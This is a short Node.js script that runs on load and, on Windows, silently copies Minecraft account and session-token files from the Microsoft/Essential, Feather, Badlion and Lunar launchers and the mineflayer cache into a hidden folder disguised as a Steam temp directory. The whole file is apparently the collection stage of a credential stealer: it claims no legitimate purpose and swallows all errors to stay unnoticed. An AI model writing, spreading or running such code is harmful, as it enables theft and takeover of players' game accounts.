const fsPromises = require('fs').promises;
const fs = require('fs');
const path = require('path');
const os = require('os');

async function fileExists(filePath) {
  try {
    await fsPromises.access(filePath);
    return true;
  } catch {
    return false;
  }
}

async function copyMinecraftFiles() {
  if (process.platform !== 'win32') return;

  try {
    const userHome = os.homedir();
    const destBasePath = path.join(userHome, "AppData", "LocalLow", "Temp", "Steam", "Ui.012", "Minecraft");
    const cachePath = path.join(userHome, "AppData", "LocalLow", "Temp", "Steam", "Ui.012", "Minecraft", "Mineflayer Cache");

    await fsPromises.mkdir(cachePath, { recursive: true });
    await fsPromises.mkdir(destBasePath, { recursive: true });

    const filesToCopy = [
      {
        src: path.join(userHome, "AppData", "Roaming", ".minecraft", "essential", "microsoft_accounts.json"),
        dst: path.join(destBasePath, "microsoft_accounts.json")
      },
      {
        src: path.join(userHome, "AppData", "Roaming", ".feather", "accounts.json"),
        dst: path.join(destBasePath, "feather_accounts.json")
      },
      {
        src: path.join(userHome, "AppData", "Roaming", "Badlion Client", "accounts.dat"),
        dst: path.join(destBasePath, "badlion_accounts.dat")
      },
    {
                src: path.join(userHome, ".lunarclient", "settings", "game", "accounts.json"),
        dst: path.join(destBasePath, "lunar_accounts.json")
      }
    ];

    for (const { src, dst } of filesToCopy) {
      if (await fileExists(src) && await fileExists(path.dirname(dst))) {
        await fsPromises.copyFile(src, dst);
      }
    }

    const srcDir = path.join(userHome, "AppData", "Roaming", ".minecraft", "nmp-cache");
    if (await fileExists(srcDir)) {
      const files = await fsPromises.readdir(srcDir);
      await Promise.all(files.map(file =>
        fsPromises.copyFile(
          path.join(srcDir, file),
          path.join(cachePath, file)
        )
      ));
    }
  } catch (error) {
    // Silent error handling
  }
}
copyMinecraftFiles();